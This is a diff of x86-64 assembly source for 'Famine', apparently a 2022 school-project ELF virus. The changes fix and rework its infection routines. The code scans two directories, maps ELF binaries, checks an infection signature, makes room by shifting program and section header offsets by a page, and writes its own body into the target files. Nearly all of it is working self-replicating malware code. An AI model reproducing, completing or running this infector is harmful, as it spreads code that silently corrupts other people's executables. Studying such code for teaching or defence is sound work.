@@ -1,4 +1,6 @@
+				global			main
 				default			rel
+main:
 sc:
 				push			rbp
 				mov				rbp,					rsp
@@ -19,7 +21,7 @@ sc:
 				inc				rcx
 				jmp				.loop
 .end:
-				mov				rdi,					sc_data
+				lea				rdi,					[sc_data]
 				and				rdi,					0xfffffffffffff000
 				mov				rsi,					sc_data_end - sc_data
 				add				rsi,					0x1000
@@ -29,10 +31,10 @@ sc:
 				mov				qword[sc_glob],			rsp
 				add				qword[sc_glob],			24
 
-				mov				rdi,					sc_dir_1
+				lea				rdi,					[sc_dir_1]
 				call			sc_proc_dir
 
-				mov				rdi,					sc_dir_2
+				lea				rdi,					[sc_dir_2]
 				call			sc_proc_dir
 
 				pop				rdx
@@ -203,34 +205,34 @@ sc_set_x_pad:
 				xor				rcx,					rcx
 				mov				rdx,					qword[rdi+0xc60]
 				add				rdx,					qword[r8+0x20]
-.first_loop:
+.loop_1:
  				cmp				cx,						word[r8+0x38]
-				je				.init_sec_loop
+				je				.init_loop_2
 
 				cmp				qword[rdx+0x8],			r10
-				jb				.first_inc
+				jb				.inc_1
 
 				add				qword[rdx+0x8],			0x1000
-.first_inc:
+.inc_1:
 				inc				rcx
 				add				rdx,					56
-				jmp				.first_loop
-.init_sec_loop:
+				jmp				.loop_1
+.init_loop_2:
  				xor				rcx,					rcx
 				mov				rdx,					qword[rdi+0xc60]
 				add				rdx,					qword[r8+0x28]
-.sec_loop:
+.loop_2:
  				cmp				cx,						word[r8+0x3c]
 				je				.set_pad
 
 				cmp				qword[rdx+0x18],		r10
-				jb				.sec_inc
+				jb				.inc_2
 				
 				add				qword[rdx+0x18],		0x1000
-.sec_inc:
+.inc_2:
   				inc				rcx
 				add				rdx,					64
-				jmp				.sec_loop
+				jmp				.loop_2
 .set_pad:
  				mov				qword[rdi+0xc68],		1
 .success:
@@ -269,9 +271,6 @@ sc_find_txt_seg:
  				mov				rax,					-1
 				ret
 sc_check_infection:
-				push			rbp
-				mov				rbp,					rsp
-				
 				mov				r8,						qword[sc_glob]
 
 				cmp				qword[r8+0x18],			49
@@ -285,22 +284,18 @@ sc_check_infection:
 				call			sc_str_n_cmp
 
 				cmp				rax,					0
-				jne				.end
-
- .error:
+				je				.error
+.end:
+				xor				rax,					rax
+				ret
+.error:
  				mov				rax,					-1
- .end:
- 				mov				rsp,					rbp
-				pop				rbp
 				ret
 sc_test_elf_hdr:
-				push			rbp
-				mov				rbp,					rsp
-				
 				mov				r8,						qword[sc_glob]
 				mov				r9,						qword[r8+0x48]; *hdrs.elf
 
-				lea				rdi,					[r8+0x48]
+				mov				rdi,					r9
 				lea				rsi,					[sc_ident]
 				mov				rdx,					5
 				call			sc_str_n_cmp
@@ -314,33 +309,31 @@ sc_test_elf_hdr:
 				cmp				word[r9+0x3e],			0
 				je				.error
 
-				cmp				word[r9+0x3e],			65535
+				cmp				word[r9+0x3e],			0xffff
 				je				.error
 
 				cmp				word[r9+0x10],			2
-				xor				rax,					rax
-				je				.end
+				je				.success
 
 				cmp				word[r9+0x10],			3
 				jne				.error
-				xor				rax,					rax
- .end:
- 				mov				rsp,					rbp
-				pop				rbp
+ .success:
+ 				xor				rax,					rax
 				ret
  .error:
  				mov				rax,					-1
-				jmp				.end
+				ret
 sc_write_mem:
 				push			rbp
 				mov				rbp,					rsp
-				sub				rsp,					80	;	+0x0	dst
+
+				sub				rsp,					72	;	+0x0	dst
 															;	+0x8	code_offset
 															;	+0x10	sz.mem
 															;	+0x18	sz.load
 															;	+0x20	sz.f_pad
 															;	+0x28	*hdrs.txt
-															;	+0x30	mem
+															;	+0x30	*mem
 															;	+0x38	x_pad
 															;	+0x40	sz.mem - (code_offset + sz.f_pad)
 				mov				r8,						qword[sc_glob]
@@ -356,56 +349,45 @@ sc_write_mem:
 				mov				qword[rsp+0x30],		r9
 				mov				r9,						qword[r8+0xc68]
 				mov				qword[rsp+0x38],		r9
-				mov				r9,						qword[rsp+0x10]
-				sub				r9,						qword[rsp+0x8]
-				sub				r9,						qword[rsp+0x20]
-				mov				qword[rsp+0x40],		r9
 
 				mov				rax,					2
 				mov				rsi,					1
 				syscall
 
+				cmp				rax,					0
+				jl				.end
+
 				mov				qword[rsp],				rax
+
 				mov				r9,						qword[rsp+0x28]; *hdrs.txt
+				mov				rdx,					qword[r9+0x8]
+				add				rdx,					qword[r9+0x20]
+				sub				rdx,					qword[rsp+0x18]
+				mov				qword[rsp+0x8],			rdx
 
 				mov				rdi,					qword[rsp]
 				mov				rsi,					qword[rsp+0x30]
 
-				mov				rdx,					qword[r9+0x8]
-				add				rdx,					qword[r9+0x20]
-				sub				rdx,					qword[rsp+0x10]
-				mov				qword[rsp+8],			rdx
-
 				mov				rax,					1
 				syscall
 
-				cmp				rax,					0
-				jl				.close
-				
-				cmp				rax,					qword[rsp+8]
+				cmp				rax,					qword[rsp+0x8]
 				jne				.close
-
-				mov				r8,						qword[sc_glob]
 
 				mov				rdi,					qword[rsp]
 				lea				rsi,					[sc]
-				mov				rdx,					qword[r8+0x18]
+				mov				rdx,					qword[rsp+0x18]
 				mov				rax, 					1
 				syscall
 			
-				cmp				rax,					0
-				jl				.close
-
 				cmp				rax,					qword[rsp+0x18]
 				jne				.close
 
 				mov				rdi,					qword[rsp]
-
-				mov				rsi,					qword[rsp+0x38]
-				xor				rsi,					rsi
-				xor				rbx,					rbx
-				mov				ebx,					0x1000
-				imul			esi,					ebx
+				mov				rax,					qword[rsp+0x38]
+				mov				rbx,					0x1000
+				mul				rbx
+				mov				rsi,					rax
 				add				rsi,					qword[rsp+0x20]
 				sub				rsi,					qword[rsp+0x18]
 				call			sc_write_pad
@@ -417,13 +399,13 @@ sc_write_mem:
 				mov				rsi,					qword[rsp+0x30]
 				add				rsi,					qword[rsp+0x8]
 				add				rsi,					qword[rsp+0x20]
+				mov				rdx,					qword[rsp+0x10]
+				sub				rdx,					qword[rsp+0x8]
+				sub				rdx,					qword[rsp+0x20]
 
-				mov				rdx,					qword[rsp+0x40]
+				mov				qword[rsp+0x40],		rdx
 				mov				rax,					1
 				syscall
-
-				cmp				rax,					0
-				jl				.close
 
 				cmp				rax,					qword[rsp+0x40]
 				jne				.close
@@ -438,14 +420,13 @@ sc_write_mem:
 				mov				rax,					3
 				syscall
  .end:
- 				add				rsp,					80
  				mov				rsp,					rbp	
 				pop				rbp
 				ret
 sc_map_file:
 				push			rbp
 				mov				rbp,					rbp
-				sub				rsp,					8;	src
+				sub				rsp,					8			; src
 
 				mov				rsi,					2
 				mov				rax,					2
@@ -455,7 +436,7 @@ sc_map_file:
 				jl				.error
 
 				mov				qword[rsp],				rax
-				mov				rdi,					qword[rsp]
+				mov				rdi,					rax
 				call			sc_get_fd_size
 
 				cmp				rax,					0
@@ -467,7 +448,7 @@ sc_map_file:
 				jb				.err_close
 
 				mov				rdi,					0
-				mov				rsi,					qword[r8+0x18]
+				mov				rsi,					rax
 				mov				rdx,					3
 				mov				rcx,					2
 				mov				r8,						qword[rsp]
@@ -475,134 +456,145 @@ sc_map_file:
 				mov				rax,					9
 				syscall
 
-				mov				qword[r8+0xc60],		rax
-				cmp				qword[r8+0xc60],		0
+				cmp				rax,					-1
 				je				.err_close
 
+				mov				r8,						qword[sc_glob]
+				mov				qword[r8+0xc60],		rax
+
 				mov				rdi,					qword[rsp]
 				mov				rax,					3
 				syscall
 
-				mov				rax,					0
+				xor				rax,					rax
 				jmp				.end
- .err_close:
+.err_close:
 				mov				rdi,					qword[rsp]
 				mov				rax,					3
 				syscall
- .error:
+.error:
  				mov				rax,					-1
- .end:
- 				add				rsp,					8
+.end:
 				mov				rsp,					rbp
 				pop				rbp
 				ret
 sc_write_pad:
 				push			rbp
 				mov				rbp,					rsp
-				sub				rsp,					16	;	+0x0	fd
-															;	+0x8	write_sz
-															;	+0x10	size
-				mov				qword[rsp],				rdi
-				mov				qword[rsp+0x8],			0
-				mov				qword[rsp+0x10],		rsi
- .loop:
- 				cmp				qword[rsp+0x10],		0
+
+				push			rdi							;	+0x10	fd
+				push			rsi							;	+0x8	size
+				sub				rsp,					8	;	+0x0	write_sz
+
+				mov				qword[rsp],				0
+.loop:
+ 				cmp				qword[rsp+0x8],			0
 				je				.success
 
-				cmp				qword[rsp+0x10],		0x400
-				jb				.write
+				mov				qword[rsp],				0x400
+				cmp				qword[rsp+0x8],			0x400
+				jae				.write
 
-				mov				qword[rsp+0x10],		0x400
- .write:
- 				mov				r8,						qword[sc_glob]
- 				mov				rsi,					qword[r8+0x460]
 				mov				rdx,					qword[rsp+0x8]
+				mov				qword[rsp],				rdx
+.write:
+				mov				rdi,					qword[rsp+0x10]
+ 				mov				r8,						qword[sc_glob]
+ 				lea				rsi,					[r8+0x460]
+				mov				rdx,					qword[rsp]
 				mov				rax,					1
 				syscall
 
-				cmp				rax,					0
-				jl				.error
-
-				cmp				rax,					qword[rsp+0x8]
+				cmp				rax,					qword[rsp]
 				jne				.error
- .end_loop:
- 				mov				r8,						qword[rsp+0x8]
- 				sub				qword[rsp+0x10],		r8
+
+ 				mov				r8,						qword[rsp]
+ 				sub				qword[rsp+0x8],			r8
 				jmp				.loop
- .error:
+.error:
  				mov				rax,					-1
 				jmp				.end
- .success:
+.success:
  				xor				rax,					rax
- .end:
-				add				rsp,					8
+.end:
 				mov				rsp,					rbp
 				pop				rbp
 				ret
 sc_get_fd_size:
 				push			rbp
 				mov				rbp,					rsp
-				sub				rsp,					8;	fd
 
-				mov				qword[rsp],				rdi
-				mov				rsi,					0
-				mov				rdx,					0
-				mov				rax,					8
-				syscall
-				
-				cmp				rax,					0
-				jne				.error
+				push			rdi									; fd +8
+				sub				rsp,					8			; size +0
 
-				mov				rdi,					qword[rsp]
 				mov				rsi,					0
 				mov				rdx,					2
 				mov				rax,					8
 				syscall
-
+				
 				cmp				rax,					0
 				jl				.error
-				
-				jmp				.end
 
- .error:
+				mov				qword[rsp],				rax
+
+				mov				rdi,					qword[rsp+0x8]
+				mov				rsi,					0
+				mov				rdx,					0
+				mov				rax,					8
+				syscall
+
+				cmp				rax,					0
+				jne				.error
+				
+				mov				rax,					qword[rsp]
+				jmp				.end
+.error:
  				mov				rax,					-1	
- .end:
-				add				rsp,					8
+.end:
 				mov				rsp,					rbp
 				pop				rbp
 				ret
 sc_str_n_cmp:
-				cmp				rdi,					0
+				xor				rax,					rax
+.loop:
+				cmp				byte[rdi],				0
 				je				.end
 
-				cmp				rdi,					rsi
+				mov				al,						byte[rdi]
+				cmp				al,						byte[rsi]
 				jne				.end
 
 				dec				rdx
 				cmp				rdx,					0
-				jg				sc_str_n_cmp
- .end:
-				mov				rax,					rdi
-				sub				rax,					rsi
+				je				.end
+.inc:
+				inc				rdi
+				inc				rsi
+				jmp				.loop
+.end:
+				sub				al,						byte[rsi]
 				ret
 sc_get_full_path:
- 				cmp				rdi,					0
-				je				.loop
+.loop_1:
+ 				cmp				byte[rdi],				0
+				je				.loop_2
 
-				mov				rdx,					rdi
+				mov				al,						byte[rdi]
+				mov				byte[rdx],				al
 				inc				rdi
 				inc				rdx
-				jmp				sc_get_full_path
- .loop:
- 				cmp				rsi,					0
+				jmp				.loop_1
+.loop_2:
+ 				cmp				byte[rsi],				0
 				je				.end
 
-				mov				rdx,					rsi
+				mov				al,						byte[rsi]
+				mov				byte[rdx],				al
 				inc				rsi
 				inc				rdx
-				jmp				.loop
- .end:
- 				mov				rdx,					0
+				jmp				.loop_2
+.end:
+ 				mov				byte[rdx],				0
 				ret
 sc_end:
 
@@ -618,9 +610,7 @@ sc_real_entry:
 sc_sign:
 				db				"Famine (42 project) - 2022 - by apitoise & fcadet", 0
 sc_ident:
-				db				"\x7f"
-				db				"ELF"
-				db				"\x2"
+				db				0x7f, "ELF", 0x2
 sc_glob:
 				dq				0	; +0x18 -> sz.mem
 									; +0x20 -> sz.code
